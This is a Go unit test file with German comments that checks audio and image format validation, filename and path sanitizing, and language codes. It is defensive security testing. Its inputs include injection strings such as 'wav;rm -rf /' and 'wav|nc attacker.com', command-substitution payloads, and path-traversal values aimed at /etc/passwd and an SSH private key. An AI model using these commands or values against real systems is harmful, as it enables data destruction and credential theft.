package security

import (
	"testing"
)

func TestValidateAudioFormat(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		// Gültige Formate
		{"wav", "wav"},
		{"mp3", "mp3"},
		{"webm", "webm"},
		{"WAV", "wav"},  // Case-insensitive
		{".mp3", "mp3"}, // Mit Punkt
		{"  ogg  ", "ogg"}, // Mit Whitespace

		// Ungültige Formate -> Default
		{"exe", "webm"},
		{"sh", "webm"},
		{"php", "webm"},
		{"", "webm"},

		// Path Traversal Versuche -> Default
		{"../etc/passwd", "webm"},
		{"..\\windows\\system32", "webm"},
		{"wav;rm -rf /", "webm"},
		{"wav && cat /etc/passwd", "webm"},
		{"wav|nc attacker.com", "webm"},
	}

	for _, tt := range tests {
		result := ValidateAudioFormat(tt.input)
		if result != tt.expected {
			t.Errorf("ValidateAudioFormat(%q) = %q, expected %q", tt.input, result, tt.expected)
		}
	}
}

func TestValidateImageFormat(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		{"png", "png"},
		{"jpg", "jpg"},
		{"jpeg", "jpeg"},
		{"WEBP", "webp"},
		{".gif", "gif"},

		// Ungültig -> Default
		{"exe", "png"},
		{"svg", "png"}, // SVG kann XSS enthalten
		{"", "png"},
	}

	for _, tt := range tests {
		result := ValidateImageFormat(tt.input)
		if result != tt.expected {
			t.Errorf("ValidateImageFormat(%q) = %q, expected %q", tt.input, result, tt.expected)
		}
	}
}

func TestSanitizeFilename(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		// Normale Dateinamen
		{"test.txt", "test.txt"},
		{"my-file_2024.pdf", "my-file_2024.pdf"},

		// Path Traversal Versuche
		{"../etc/passwd", "passwd"},
		{"..\\..\\windows\\system32\\config", "config"},
		{"/etc/passwd", "passwd"},

		// Shell Metazeichen - alle Sonderzeichen werden zu _
		{"file;rm.txt", "file_rm.txt"},
		{"file$(whoami).txt", "file_whoami_.txt"},
		{"file`id`.txt", "file_id_.txt"},
		{"file|cat.txt", "file_cat.txt"},

		// Doppelte Punkte werden zu einem
		{"file..txt", "file.txt"},

		// Leere/ungültige Namen
		{"", "unnamed"},
		{".", "unnamed"},
		{"..", "unnamed"},
	}

	for _, tt := range tests {
		result := SanitizeFilename(tt.input)
		if result != tt.expected {
			t.Errorf("SanitizeFilename(%q) = %q, expected %q", tt.input, result, tt.expected)
		}
	}
}

func TestSanitizePath(t *testing.T) {
	tests := []struct {
		basePath string
		userPath string
		valid    bool
	}{
		// Gültige Pfade
		{"/tmp/uploads", "file.txt", true},
		{"/tmp/uploads", "subdir/file.txt", true},

		// Path Traversal Versuche -> ungültig
		{"/tmp/uploads", "../etc/passwd", false},
		{"/tmp/uploads", "../../root/.ssh/id_rsa", false},
		{"/tmp/uploads", "/etc/passwd", false},
		{"/tmp/uploads", "subdir/../../../etc/passwd", false},
	}

	for _, tt := range tests {
		_, valid := SanitizePath(tt.basePath, tt.userPath)
		if valid != tt.valid {
			t.Errorf("SanitizePath(%q, %q) valid = %v, expected %v",
				tt.basePath, tt.userPath, valid, tt.valid)
		}
	}
}

func TestIsValidLanguageCode(t *testing.T) {
	// Gültige Codes
	validCodes := []string{"de", "en", "tr", "DE", "deu", "eng"}
	for _, code := range validCodes {
		if !IsValidLanguageCode(code) {
			t.Errorf("IsValidLanguageCode(%q) = false, expected true", code)
		}
	}

	// Ungültige Codes
	invalidCodes := []string{"xx", "abc", "123", "../etc", ""}
	for _, code := range invalidCodes {
		if IsValidLanguageCode(code) {
			t.Errorf("IsValidLanguageCode(%q) = true, expected false", code)
		}
	}
}
